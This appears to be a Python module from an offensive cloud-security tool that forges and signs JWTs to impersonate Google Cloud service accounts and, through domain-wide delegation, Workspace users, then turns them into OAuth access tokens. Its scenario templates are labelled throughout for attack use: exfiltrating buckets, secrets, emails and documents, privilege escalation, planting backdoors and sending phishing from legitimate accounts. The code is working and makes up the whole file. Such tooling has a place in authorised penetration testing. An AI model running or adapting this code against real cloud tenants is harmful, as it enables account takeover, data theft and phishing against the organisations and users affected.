"""
GCP JWT-based Service Account Impersonation.

Creates self-signed JWTs to impersonate service accounts without requiring
the iam.serviceAccounts.getAccessToken permission.

This technique:
- Only requires the service account's private key (obtainable via iam.serviceAccountKeys.create)
- Works offline (no API calls needed for JWT generation)
- Supports custom claims for advanced scenarios
- Can be used for domain-wide delegation
- Useful for service-to-service authentication

Usage scenarios:
1. Standard OAuth token: scope-based access to GCP APIs
2. Service-to-service auth: audience-based JWT for Cloud Run, GKE, etc.
3. Domain-wide delegation: impersonate users in Google Workspace
4. Custom claims: add arbitrary claims for specific use cases

References:
- https://cloud.google.com/iam/docs/create-short-lived-credentials-direct
- https://developers.google.com/identity/protocols/oauth2/service-account
- https://cloud.google.com/iam/docs/workforce-obtaining-short-lived-credentials
"""

import json
import time
from pathlib import Path
from typing import Dict, Any, Optional, List, TYPE_CHECKING
from datetime import datetime, timedelta

import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.syntax import Syntax

if TYPE_CHECKING:
    from ...gcp_session import GCPSessionManager

console = Console()

# OAuth token endpoint
OAUTH_TOKEN_ENDPOINT = "https://oauth2.googleapis.com/token"

# IAM Credentials API
IAM_CREDENTIALS_API = "https://iamcredentials.googleapis.com/v1"

# Default scopes
DEFAULT_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"]

# JWT Templates for common scenarios
JWT_TEMPLATES = {
    "gcp_full": {
        "name": "Full GCP Access (cloud-platform)",
        "description": "Complete access to all GCP services",
        "scopes": ["https://www.googleapis.com/auth/cloud-platform"],
        "use_case": "General GCP enumeration, exploitation, lateral movement",
    },
    "storage": {
        "name": "Google Cloud Storage Access",
        "description": "Read/write access to GCS buckets",
        "scopes": [
            "https://www.googleapis.com/auth/devstorage.read_write",
            "https://www.googleapis.com/auth/cloud-platform",
        ],
        "use_case": "Exfiltrate data from GCS buckets, upload backdoors",
    },
    "compute": {
        "name": "Compute Engine Access",
        "description": "Manage Compute Engine instances",
        "scopes": [
            "https://www.googleapis.com/auth/compute",
            "https://www.googleapis.com/auth/cloud-platform",
        ],
        "use_case": "Create/modify VMs, access instance metadata",
    },
    "iam": {
        "name": "IAM Administration",
        "description": "Manage IAM policies and service accounts",
        "scopes": [
            "https://www.googleapis.com/auth/iam",
            "https://www.googleapis.com/auth/cloud-platform",
        ],
        "use_case": "Privilege escalation, modify IAM policies, create SA keys",
    },
    "secrets": {
        "name": "Secret Manager Access",
        "description": "Read secrets from Secret Manager",
        "scopes": [
            "https://www.googleapis.com/auth/cloud-platform",
        ],
        "use_case": "Exfiltrate secrets, passwords, API keys",
    },
    "drive": {
        "name": "Google Drive Access (read-only)",
        "description": "Read files from Google Drive",
        "scopes": [
            "https://www.googleapis.com/auth/drive.readonly",
            "https://www.googleapis.com/auth/drive.metadata.readonly",
        ],
        "use_case": "Exfiltrate documents, search for sensitive files",
    },
    "drive_full": {
        "name": "Google Drive Access (full)",
        "description": "Full read/write access to Google Drive",
        "scopes": [
            "https://www.googleapis.com/auth/drive",
        ],
        "use_case": "Exfiltrate/modify documents, upload backdoors",
    },
    "workspace_admin": {
        "name": "Google Workspace Admin (requires delegation)",
        "description": "Manage users, groups, and org settings",
        "scopes": [
            "https://www.googleapis.com/auth/admin.directory.user",
            "https://www.googleapis.com/auth/admin.directory.group",
        ],
        "use_case": "Create admin users, modify org policies, privilege escalation",
        "requires_subject": True,
    },
    "gmail": {
        "name": "Gmail Access (requires delegation)",
        "description": "Read/send emails as a user",
        "scopes": [
            "https://www.googleapis.com/auth/gmail.readonly",
            "https://www.googleapis.com/auth/gmail.send",
        ],
        "use_case": "Exfiltrate emails, send phishing from legitimate accounts",
        "requires_subject": True,
    },
    "calendar": {
        "name": "Google Calendar Access (requires delegation)",
        "description": "Read/modify calendar events",
        "scopes": [
            "https://www.googleapis.com/auth/calendar",
        ],
        "use_case": "Reconnaissance (meeting schedules), create fake meetings",
        "requires_subject": True,
    },
    "cloudrun": {
        "name": "Cloud Run Service Authentication",
        "description": "Authenticate to a specific Cloud Run service",
        "audience": "https://your-service-xyz.run.app",
        "use_case": "Access protected Cloud Run endpoints",
        "is_audience_based": True,
    },
    "gke": {
        "name": "GKE Service Authentication",
        "description": "Authenticate to GKE cluster services",
        "audience": "https://container.googleapis.com/v1/projects/PROJECT/locations/LOCATION/clusters/CLUSTER",
        "use_case": "Access GKE cluster APIs",
        "is_audience_based": True,
    },
}


def _preview_jwt_claims(
    sa_email: str,
    scopes: Optional[List[str]] = None,
    audience: Optional[str] = None,
    subject_email: Optional[str] = None,
    custom_claims: Optional[Dict[str, Any]] = None,
) -> None:
    """
    Show a preview of JWT claims that will be generated.

    Args:
        sa_email: Service account email (for iss)
        scopes: OAuth scopes
        audience: Target audience
        subject_email: Subject email for delegation
        custom_claims: Additional custom claims
    """
    import time

    console.print("\n[bold]JWT Claims Preview:[/bold]")
    console.print("[dim]These claims will be included in the JWT:[/dim]\n")

    table = Table(show_header=True, expand=False)
    table.add_column("Claim", style="cyan")
    table.add_column("Value", style="green")
    table.add_column("Source", style="dim")

    # Base claims
    table.add_row("iss", sa_email, "Service Account")
    table.add_row("iat", f"{int(time.time())} (now)", "Auto-generated")
    table.add_row("exp", f"{int(time.time()) + 3600} (+1h)", "Auto-generated")

    # Subject
    if subject_email:
        table.add_row("sub", subject_email, "Domain-wide delegation")
    else:
        table.add_row("sub", sa_email, "Default (SA email)")

    # Audience
    if audience:
        table.add_row("aud", audience, "Service-to-service")
    else:
        table.add_row("aud", OAUTH_TOKEN_ENDPOINT, "OAuth token exchange")

    # Scope
    if scopes and not audience:
        table.add_row("scope", " ".join(scopes), "OAuth scopes")

    # Custom claims
    if custom_claims:
        for claim_name, claim_value in custom_claims.items():
            value_str = str(claim_value)
            if len(value_str) > 60:
                value_str = value_str[:57] + "..."
            table.add_row(claim_name, value_str, "Custom")

    console.print(table)
    console.print()


def _interactive_custom_claims() -> Dict[str, Any]:
    """
    Interactive prompt to add custom JWT claims.

    Returns:
        Dictionary of custom claims
    """
    console.print("\n[bold cyan]Custom JWT Claims[/bold cyan]")
    console.print("[dim]Add custom claims to the JWT (e.g., iss, sub, azp, email, etc.)[/dim]")
    console.print("[dim]Common claims:[/dim]")
    console.print("  [dim]- iss: Issuer (overrides default SA email)[/dim]")
    console.print("  [dim]- sub: Subject (overrides default SA email or --subject)[/dim]")
    console.print("  [dim]- azp: Authorized party[/dim]")
    console.print("  [dim]- email: Email address for delegation[/dim]")
    console.print("  [dim]- target_audience: Custom target audience[/dim]")
    console.print("[dim]Leave claim name empty to finish[/dim]\n")

    custom_claims = {}

    while True:
        claim_name = Prompt.ask(
            "[cyan]Claim name (empty to finish)[/cyan]",
            default="",
        )

        if not claim_name:
            break

        claim_value = Prompt.ask(f"[cyan]Value for '{claim_name}'[/cyan]")

        # Try to parse as JSON if it looks like a complex value
        if claim_value.startswith("{") or claim_value.startswith("["):
            try:
                import json
                claim_value = json.loads(claim_value)
            except json.JSONDecodeError:
                pass  # Use as string

        custom_claims[claim_name] = claim_value
        console.print(f"  [green]✓ Added: {claim_name} = {claim_value}[/green]")

    if custom_claims:
        console.print(f"\n[green]Added {len(custom_claims)} custom claim(s)[/green]")

    return custom_claims


def show_jwt_templates() -> None:
    """Display available JWT templates for common scenarios."""
    table = Table(title="JWT Templates - Common Attack Scenarios", expand=True)
    table.add_column("ID", style="cyan", width=20)
    table.add_column("Name", style="green")
    table.add_column("Use Case", style="yellow")
    table.add_column("Type", style="dim")

    for template_id, template in JWT_TEMPLATES.items():
        template_type = "Audience-based" if template.get("is_audience_based") else "OAuth Scopes"
        if template.get("requires_subject"):
            template_type += " + Delegation"

        table.add_row(
            template_id,
            template["name"],
            template["use_case"],
            template_type,
        )

    console.print(table)
    console.print("\n[dim]Usage: impersonate_jwt --template <template_id>[/dim]")
    console.print("[dim]Or use: impersonate_jwt (interactive mode)[/dim]\n")


def select_jwt_template_interactive() -> Optional[Dict[str, Any]]:
    """
    Interactive wizard to select and configure a JWT template.

    Returns:
        Dictionary with configured parameters (scopes, audience, subject, etc.)
    """
    console.print("\n[bold cyan]JWT Impersonation Wizard[/bold cyan]")
    console.print("[dim]Select a scenario for JWT generation[/dim]\n")

    # Show templates grouped by category
    gcp_templates = {k: v for k, v in JWT_TEMPLATES.items() if not v.get("is_audience_based") and not v.get("requires_subject")}
    workspace_templates = {k: v for k, v in JWT_TEMPLATES.items() if v.get("requires_subject")}
    service_templates = {k: v for k, v in JWT_TEMPLATES.items() if v.get("is_audience_based")}

    console.print("[bold]GCP Services:[/bold]")
    for i, (template_id, template) in enumerate(gcp_templates.items(), 1):
        console.print(f"  [{i}] {template['name']} - [dim]{template['use_case']}[/dim]")

    offset = len(gcp_templates)
    console.print("\n[bold]Google Workspace (requires domain-wide delegation):[/bold]")
    for i, (template_id, template) in enumerate(workspace_templates.items(), offset + 1):
        console.print(f"  [{i}] {template['name']} - [dim]{template['use_case']}[/dim]")

    offset += len(workspace_templates)
    console.print("\n[bold]Service-to-Service Authentication:[/bold]")
    for i, (template_id, template) in enumerate(service_templates.items(), offset + 1):
        console.print(f"  [{i}] {template['name']} - [dim]{template['use_case']}[/dim]")

    # User selection
    console.print()
    choice = Prompt.ask(
        "[cyan]Select scenario[/cyan]",
        choices=[str(i) for i in range(1, len(JWT_TEMPLATES) + 1)],
    )

    # Get selected template
    template_id = list(JWT_TEMPLATES.keys())[int(choice) - 1]
    template = JWT_TEMPLATES[template_id]

    console.print(f"\n[green]Selected: {template['name']}[/green]")
    console.print(f"[dim]{template['description']}[/dim]\n")

    # Configure parameters
    config = {}

    if template.get("is_audience_based"):
        # Audience-based (Cloud Run, GKE, etc.)
        console.print("[yellow]This requires a custom audience URL.[/yellow]")
        default_audience = template.get("audience", "")
        audience = Prompt.ask(
            "[cyan]Target audience URL[/cyan]",
            default=default_audience if default_audience != "https://your-service-xyz.run.app" else "",
        )
        config["audience"] = audience
    else:
        # Scope-based
        scopes = template.get("scopes", DEFAULT_SCOPES)
        console.print(f"[dim]Scopes: {', '.join(scopes)}[/dim]")
        config["scopes"] = scopes

    # Domain-wide delegation
    if template.get("requires_subject"):
        console.print("\n[yellow]Domain-wide delegation required.[/yellow]")
        console.print("[dim]You must impersonate a user email (e.g., admin@example.com)[/dim]")
        subject_email = Prompt.ask("[cyan]User email to impersonate[/cyan]")
        config["subject_email"] = subject_email

    # Show configuration summary
    console.print("\n[bold]Configuration Summary:[/bold]")
    if "scopes" in config:
        console.print(f"  Scopes: [cyan]{', '.join(config['scopes'])}[/cyan]")
    if "audience" in config:
        console.print(f"  Audience: [cyan]{config['audience']}[/cyan]")
    if "subject_email" in config:
        console.print(f"  Impersonate: [cyan]{config['subject_email']}[/cyan]")

    # Ask if user wants to add custom claims
    console.print()
    if Confirm.ask("[cyan]Add custom JWT claims?[/cyan]", default=False):
        custom_claims = _interactive_custom_claims()
        if custom_claims:
            config["custom_claims"] = custom_claims

    console.print()

    return config


def apply_template(template_id: str) -> Optional[Dict[str, Any]]:
    """
    Apply a JWT template and return configuration.

    Args:
        template_id: Template identifier (e.g., "gcp_full", "drive", etc.)

    Returns:
        Dictionary with configured parameters
    """
    if template_id not in JWT_TEMPLATES:
        console.print(f"[red]Unknown template: {template_id}[/red]")
        console.print("[yellow]Use 'show_jwt_templates' to see available templates.[/yellow]")
        return None

    template = JWT_TEMPLATES[template_id]
    config = {}

    console.print(f"[green]Using template: {template['name']}[/green]")
    console.print(f"[dim]{template['description']}[/dim]\n")

    if template.get("is_audience_based"):
        # Audience-based template
        default_audience = template.get("audience", "")
        if "your-service" in default_audience or "PROJECT" in default_audience:
            # Need user input
            audience = Prompt.ask("[cyan]Target audience URL[/cyan]")
            config["audience"] = audience
        else:
            config["audience"] = default_audience
    else:
        # Scope-based template
        config["scopes"] = template.get("scopes", DEFAULT_SCOPES)

    if template.get("requires_subject"):
        subject_email = Prompt.ask("[cyan]User email to impersonate[/cyan]")
        config["subject_email"] = subject_email

    return config


def _sign_jwt_remotely(
    session_mgr: "GCPSessionManager",
    target_sa_email: str,
    claims: Dict[str, Any],
) -> Optional[str]:
    """
    Sign JWT using GCP IAM Credentials API (remote signing).

    This requires iam.serviceAccounts.signJwt permission on the target SA.
    Useful when you want to generate a JWT for a different SA than the one
    you're currently authenticated as.

    Args:
        session_mgr: GCP session manager with valid credentials
        target_sa_email: Email of the service account to sign as
        claims: JWT claims/payload to sign

    Returns:
        Signed JWT string or None on failure
    """
    console.print(f"[cyan]Using remote signing via IAM Credentials API for {target_sa_email}[/cyan]")

    # Get access token for current session
    token = session_mgr.get_access_token()
    if not token:
        console.print("[red]Failed to get access token for remote signing[/red]")
        return None

    # Call signJwt API
    url = f"{IAM_CREDENTIALS_API}/projects/-/serviceAccounts/{target_sa_email}:signJwt"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # API expects the payload as a JSON string
    payload = {
        "payload": json.dumps(claims),
    }

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=30)

        if response.status_code != 200:
            error_data = response.json() if response.headers.get("content-type", "").startswith("application/json") else {}
            error_msg = error_data.get("error", {}).get("message", response.text)
            console.print(f"[red]Remote signing failed: {error_msg}[/red]")

            # Check for common permission errors
            if "PERMISSION_DENIED" in str(error_data) or response.status_code == 403:
                console.print(f"[yellow]Missing permission: iam.serviceAccounts.signJwt on {target_sa_email}[/yellow]")
                console.print("[dim]Run 'enumerate_sa_permissions' to check your permissions[/dim]")

            return None

        result = response.json()
        signed_jwt = result.get("signedJwt")

        if not signed_jwt:
            console.print("[red]Remote signing succeeded but no JWT returned[/red]")
            return None

        console.print("[green]JWT successfully signed remotely[/green]")
        return signed_jwt

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error during remote signing: {str(e)}[/red]")
        return None


def generate_signed_jwt(
    session_mgr: "GCPSessionManager",
    sa_key_file: Optional[str] = None,
    claims_file: Optional[str] = None,
    custom_claims: Optional[Dict[str, Any]] = None,
    scopes: Optional[List[str]] = None,
    audience: Optional[str] = None,
    lifetime: int = 3600,
    subject_email: Optional[str] = None,
) -> Optional[str]:
    """
    Generate a signed JWT for service account impersonation.

    This function supports TWO signing methods:
    1. LOCAL SIGNING: Uses the SA's private key to sign locally (offline)
    2. REMOTE SIGNING: Uses GCP IAM Credentials API to sign server-side

    Remote signing is automatically used when:
    - The target SA (from custom_claims["iss"]) differs from the current SA
    - No private key is available for the target SA
    - Requires: iam.serviceAccounts.signJwt permission on target SA

    Args:
        session_mgr: GCP session manager
        sa_key_file: Path to service account JSON key file (if not provided, uses current session)
        claims_file: Path to JSON file containing custom claims to add
        custom_claims: Dictionary of custom claims to add (can override "iss" to target different SA)
        scopes: OAuth scopes (for OAuth tokens). Ignored if audience is set.
        audience: Target audience (for service-to-service auth). Mutually exclusive with scopes.
        lifetime: Token lifetime in seconds (max 3600 = 1 hour)
        subject_email: Email to impersonate (for domain-wide delegation)

    Returns:
        Signed JWT string or None on failure

    Examples:
        # Local signing: OAuth token with custom scopes
        jwt = generate_signed_jwt(
            session_mgr,
            scopes=["https://www.googleapis.com/auth/drive"],
            lifetime=3600
        )

        # Remote signing: Generate JWT for a different SA
        # Requires: deploy@ has signJwt permission on gdrive@
        jwt = generate_signed_jwt(
            session_mgr,
            custom_claims={"iss": "gdrive@production.iam.gserviceaccount.com"},
            scopes=["https://www.googleapis.com/auth/drive.readonly"]
        )

        # Service-to-service auth (Cloud Run)
        jwt = generate_signed_jwt(
            session_mgr,
            audience="https://my-service-xyz.run.app"
        )

        # Domain-wide delegation
        jwt = generate_signed_jwt(
            session_mgr,
            scopes=["https://www.googleapis.com/auth/admin.directory.user"],
            subject_email="admin@example.com"
        )
    """
    try:
        import jwt as pyjwt
    except ImportError:
        console.print("[red]PyJWT library not found. Install with: pip install pyjwt[/red]")
        return None

    # Determine the current SA (the one we're authenticated as)
    current_sa_email = session_mgr.current_session_data.get("service_account_email")

    # Determine the target SA (the one we want to generate JWT for)
    # Priority: custom_claims["iss"] > sa_key_file > current session
    target_sa_email = None

    # Check if custom_claims override the issuer
    if custom_claims and "iss" in custom_claims:
        target_sa_email = custom_claims["iss"]
        console.print(f"[dim]Target SA from custom claims: {target_sa_email}[/dim]")

    # Load service account key (if provided or needed for local signing)
    sa_key = None
    if sa_key_file:
        key_path = Path(sa_key_file).expanduser().resolve()
        if not key_path.exists():
            console.print(f"[red]Service account key file not found: {sa_key_file}[/red]")
            return None

        with open(key_path, "r") as f:
            sa_key = json.load(f)

        # If target SA not set by custom claims, use the SA from the key file
        if not target_sa_email:
            target_sa_email = sa_key.get("client_email")
    else:
        # Use current session's SA
        if not target_sa_email:
            target_sa_email = current_sa_email

        # Try to load SA key from session (for local signing)
        auth_method = session_mgr.current_session_data.get("auth_method")
        if auth_method == "service_account":
            sa_key_path = session_mgr.current_session_data.get("service_account_file")
            if sa_key_path and Path(sa_key_path).exists():
                with open(sa_key_path, "r") as f:
                    sa_key = json.load(f)

    if not target_sa_email:
        console.print("[red]Could not determine target service account email[/red]")
        return None

    # Build JWT claims
    now = int(time.time())
    exp_time = now + min(lifetime, 3600)  # Max 1 hour

    # Base claims (required)
    claims = {
        "iss": target_sa_email,
        "iat": now,
        "exp": exp_time,
    }

    # Determine audience and scope
    if audience:
        # Service-to-service auth: use custom audience
        claims["aud"] = audience
        claims["sub"] = target_sa_email
    else:
        # OAuth token: use token endpoint as audience
        claims["aud"] = OAUTH_TOKEN_ENDPOINT
        claims["sub"] = target_sa_email

        # Add scopes
        if scopes is None:
            scopes = DEFAULT_SCOPES
        claims["scope"] = " ".join(scopes)

    # Add subject email for domain-wide delegation
    if subject_email:
        claims["sub"] = subject_email
        console.print(f"[cyan]Using domain-wide delegation: impersonating {subject_email}[/cyan]")

    # Load custom claims from file
    if claims_file:
        claims_path = Path(claims_file).expanduser().resolve()
        if not claims_path.exists():
            console.print(f"[yellow]Claims file not found: {claims_file}[/yellow]")
        else:
            with open(claims_path, "r") as f:
                file_claims = json.load(f)
            console.print(f"[dim]Loaded {len(file_claims)} claims from {claims_file}[/dim]")
            claims.update(file_claims)

    # Add custom claims from parameter
    if custom_claims:
        console.print(f"[dim]Adding {len(custom_claims)} custom claims[/dim]")
        claims.update(custom_claims)

    # After applying all custom claims, update target_sa_email if iss was overridden
    # This ensures the JWT is signed by the correct SA (the one declared in iss)
    final_iss = claims.get("iss")
    if final_iss and final_iss != target_sa_email:
        console.print(f"[yellow]Note: 'iss' claim was overridden to {final_iss}[/yellow]")
        target_sa_email = final_iss

    # Display claims
    _display_jwt_claims(claims)

    # Determine signing method: remote vs local
    use_remote_signing = False

    # Use remote signing if:
    # 1. Target SA is different from current SA (cross-SA impersonation)
    # 2. We don't have the private key for the target SA
    if target_sa_email != current_sa_email:
        console.print(f"[yellow]Target SA ({target_sa_email}) differs from current SA ({current_sa_email})[/yellow]")
        console.print("[cyan]Will attempt remote signing via IAM Credentials API[/cyan]")
        use_remote_signing = True
    elif not sa_key or "private_key" not in sa_key:
        console.print("[yellow]No private key available for local signing[/yellow]")
        console.print("[cyan]Will attempt remote signing via IAM Credentials API[/cyan]")
        use_remote_signing = True

    # Sign JWT
    if use_remote_signing:
        # Remote signing via IAM Credentials API
        # Use the final iss claim to determine which SA to sign as
        signed_jwt = _sign_jwt_remotely(session_mgr, target_sa_email, claims)
        if not signed_jwt:
            return None
    else:
        # Local signing with PyJWT
        try:
            import jwt as pyjwt
        except ImportError:
            console.print("[red]PyJWT library not found. Install with: pip install pyjwt[/red]")
            return None

        # Validate SA key structure for local signing
        required_fields = ["private_key", "private_key_id"]
        if not all(field in sa_key for field in required_fields):
            console.print("[red]Invalid service account key: missing private_key or private_key_id[/red]")
            return None

        console.print(f"[cyan]Using local signing with private key[/cyan]")
        try:
            signed_jwt = pyjwt.encode(
                claims,
                sa_key["private_key"],
                algorithm="RS256",
                headers={"kid": sa_key["private_key_id"]}
            )
        except Exception as e:
            console.print(f"[red]Failed to sign JWT locally: {str(e)}[/red]")
            return None

        console.print(f"[green]JWT successfully signed locally ({len(signed_jwt)} bytes)[/green]")

    console.print(f"[dim]Valid for {lifetime} seconds (until {datetime.fromtimestamp(exp_time).strftime('%Y-%m-%d %H:%M:%S')})[/dim]")

    return signed_jwt


def exchange_jwt_for_token(
    jwt_token: str,
    show_details: bool = True,
) -> Optional[Dict[str, Any]]:
    """
    Exchange a signed JWT for an OAuth access token.

    This is only needed when the JWT was created for OAuth (not service-to-service auth).

    Args:
        jwt_token: Signed JWT string
        show_details: Show token details in console

    Returns:
        Dictionary with:
        - access_token: OAuth access token
        - expires_in: Token lifetime in seconds
        - token_type: "Bearer"
    """
    console.print("[dim]Exchanging JWT for OAuth access token...[/dim]")

    try:
        response = requests.post(
            OAUTH_TOKEN_ENDPOINT,
            data={
                "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                "assertion": jwt_token,
            },
            timeout=30,
        )

        if response.status_code != 200:
            error_data = response.json() if response.headers.get("content-type", "").startswith("application/json") else {}
            error_msg = error_data.get("error_description", response.text)
            console.print(f"[red]Token exchange failed: {error_msg}[/red]")
            return None

        token_data = response.json()

        if show_details:
            console.print("[green]Successfully obtained access token![/green]")
            console.print(f"[dim]Token type: {token_data.get('token_type')}[/dim]")
            console.print(f"[dim]Expires in: {token_data.get('expires_in')} seconds[/dim]")

        return token_data

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {str(e)}[/red]")
        return None


def impersonate_with_jwt(
    session_mgr: "GCPSessionManager",
    sa_key_file: Optional[str] = None,
    claims_file: Optional[str] = None,
    custom_claims: Optional[Dict[str, Any]] = None,
    scopes: Optional[List[str]] = None,
    audience: Optional[str] = None,
    subject_email: Optional[str] = None,
    template_id: Optional[str] = None,
    interactive: bool = False,
    create_session: bool = True,
    session_name: Optional[str] = None,
) -> bool:
    """
    Generate JWT and optionally exchange for access token, then create a new session.

    Args:
        session_mgr: GCP session manager
        sa_key_file: Path to service account JSON key file
        claims_file: Path to JSON file containing custom claims
        custom_claims: Dictionary of custom claims
        scopes: OAuth scopes (for OAuth tokens)
        audience: Target audience (for service-to-service auth)
        subject_email: Email to impersonate (for domain-wide delegation)
        template_id: Use a predefined template (e.g., "gcp_full", "drive", "workspace_admin")
        interactive: Launch interactive wizard to select template
        create_session: Create a new CloudKnife session with the token
        session_name: Name for the new session (auto-generated if not provided)

    Returns:
        True if successful
    """
    # Interactive mode: show wizard
    if interactive or (not template_id and not scopes and not audience and not claims_file):
        template_config = select_jwt_template_interactive()
        if not template_config:
            return False

        # Apply template configuration
        scopes = template_config.get("scopes", scopes)
        audience = template_config.get("audience", audience)
        subject_email = template_config.get("subject_email", subject_email)

        # Merge custom claims from wizard
        wizard_custom_claims = template_config.get("custom_claims", {})
        if wizard_custom_claims:
            if custom_claims:
                custom_claims.update(wizard_custom_claims)
            else:
                custom_claims = wizard_custom_claims

    # Template mode: apply predefined template
    elif template_id:
        template_config = apply_template(template_id)
        if not template_config:
            return False

        # Apply template configuration (don't override explicit parameters)
        if not scopes and "scopes" in template_config:
            scopes = template_config["scopes"]
        if not audience and "audience" in template_config:
            audience = template_config["audience"]
        if not subject_email and "subject_email" in template_config:
            subject_email = template_config["subject_email"]

    # Show JWT claims preview (if interactive mode or template mode)
    if interactive or template_id:
        # Load SA key to get email for preview
        if sa_key_file:
            key_path = Path(sa_key_file).expanduser().resolve()
            if key_path.exists():
                with open(key_path, "r") as f:
                    sa_key = json.load(f)
                sa_email = sa_key.get("client_email", "unknown@unknown.iam.gserviceaccount.com")
            else:
                sa_email = "unknown@unknown.iam.gserviceaccount.com"
        else:
            # Use current session's SA email
            sa_email = session_mgr.current_session_data.get("service_account_email", "unknown@unknown.iam.gserviceaccount.com")

        _preview_jwt_claims(
            sa_email=sa_email,
            scopes=scopes,
            audience=audience,
            subject_email=subject_email,
            custom_claims=custom_claims,
        )

        if not Confirm.ask("[cyan]Continue with JWT generation?[/cyan]", default=True):
            console.print("[yellow]JWT generation cancelled[/yellow]")
            return False

    # Generate signed JWT
    jwt_token = generate_signed_jwt(
        session_mgr,
        sa_key_file=sa_key_file,
        claims_file=claims_file,
        custom_claims=custom_claims,
        scopes=scopes,
        audience=audience,
        subject_email=subject_email,
    )

    if not jwt_token:
        return False

    # Show JWT for manual use
    console.print("\n[bold cyan]Signed JWT:[/bold cyan]")
    console.print(f"[dim]{jwt_token[:80]}...[/dim]\n")

    # Show usage examples
    _show_jwt_usage_examples(jwt_token, audience is not None)

    # If audience-based (service-to-service), don't exchange for OAuth token
    if audience:
        console.print("\n[yellow]Note: This JWT uses a custom audience (service-to-service auth).[/yellow]")
        console.print("[yellow]Use it directly as a Bearer token, don't exchange for OAuth token.[/yellow]")

        if create_session:
            console.print("\n[dim]Cannot create CloudKnife session with audience-based JWT.[/dim]")
            console.print("[dim]Use the JWT directly in Authorization headers.[/dim]")

        return True

    # Exchange JWT for OAuth access token
    if Confirm.ask("\n[cyan]Exchange JWT for OAuth access token?[/cyan]", default=True):
        token_data = exchange_jwt_for_token(jwt_token)

        if not token_data:
            return False

        access_token = token_data.get("access_token")

        # Display token
        console.print("\n[bold green]Access Token:[/bold green]")
        console.print(f"[dim]{access_token[:80]}...[/dim]")

        # Create new session if requested
        if create_session:
            if not session_name:
                # Auto-generate session name
                sa_email = session_mgr.current_session_data.get("service_account_email", "unknown")
                sa_name = sa_email.split("@")[0] if "@" in sa_email else sa_email
                timestamp = datetime.now().strftime("%m%d-%H%M")
                session_name = f"jwt-{sa_name}-{timestamp}"

            # Get project and SA email
            if sa_key_file:
                with open(Path(sa_key_file).expanduser().resolve(), "r") as f:
                    sa_key = json.load(f)
                sa_email = sa_key.get("client_email")
                project_id = sa_key.get("project_id")
            else:
                sa_email = session_mgr.current_session_data.get("service_account_email")
                project_id = session_mgr.current_session_data.get("project_id")

            # Create session
            session_mgr.create_or_load_session(session_name)
            session_mgr.set_access_token(
                access_token,
                project_id=project_id,
                service_account_email=subject_email if subject_email else sa_email,
                skip_tokeninfo=False,
            )

            console.print(f"\n[green]Created new session: {session_name}[/green]")
            console.print(f"[dim]Service Account: {sa_email}[/dim]")
            if subject_email:
                console.print(f"[dim]Impersonating: {subject_email}[/dim]")
            console.print(f"[dim]Use 'use_session {session_name}' to switch to it.[/dim]")

        return True

    return True


def _display_jwt_claims(claims: Dict[str, Any]) -> None:
    """Display JWT claims in a formatted table."""
    table = Table(title="JWT Claims", expand=False)
    table.add_column("Claim", style="cyan")
    table.add_column("Value", style="green")

    for key, value in sorted(claims.items()):
        # Format timestamps
        if key in ("iat", "exp") and isinstance(value, (int, float)):
            formatted_value = f"{value} ({datetime.fromtimestamp(value).strftime('%Y-%m-%d %H:%M:%S')})"
        else:
            formatted_value = str(value)

        table.add_row(key, formatted_value)

    console.print(table)


def _show_jwt_usage_examples(jwt_token: str, is_audience_based: bool) -> None:
    """Show usage examples for the JWT."""
    console.print("[bold]Usage Examples:[/bold]\n")

    if is_audience_based:
        # Service-to-service auth
        console.print("[cyan]Use directly as Bearer token:[/cyan]")

        curl_example = f'''curl -H "Authorization: Bearer {jwt_token[:50]}..." \\
  https://your-service.run.app/endpoint'''

        console.print(Syntax(curl_example, "bash", theme="monokai", word_wrap=True))
    else:
        # OAuth token exchange
        console.print("[cyan]1. Exchange for OAuth access token:[/cyan]")

        curl_exchange = f'''curl -X POST {OAUTH_TOKEN_ENDPOINT} \\
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \\
  -d "assertion={jwt_token[:50]}..."'''

        console.print(Syntax(curl_exchange, "bash", theme="monokai", word_wrap=True))

        console.print("\n[cyan]2. Or use JWT directly for some GCP services:[/cyan]")
        console.print("[dim](Some APIs accept JWTs directly without exchange)[/dim]\n")
